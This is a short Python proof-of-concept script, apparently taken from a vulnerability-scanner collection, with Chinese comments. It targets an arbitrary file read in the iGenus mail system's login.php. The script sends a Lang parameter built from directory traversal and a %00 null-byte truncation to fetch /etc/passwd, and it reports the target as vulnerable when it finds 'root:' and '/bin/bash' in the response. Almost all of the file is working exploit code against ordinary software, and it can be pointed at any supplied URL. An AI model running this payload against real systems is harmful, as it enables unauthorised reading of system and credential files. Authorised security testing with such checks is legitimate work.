#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: iGenus邮箱系统login.php 参数Lang任意文件读取
referer: http://www.wooyun.org/bugs/WooYun-2015-136712
author: Lucifer
description: Lang存在遍历，%00截断。
'''
import sys
import requests
import warnings
def run(url):
        result = ['iGenus邮箱系统login.php 参数Lang任意文件读取','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpg"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

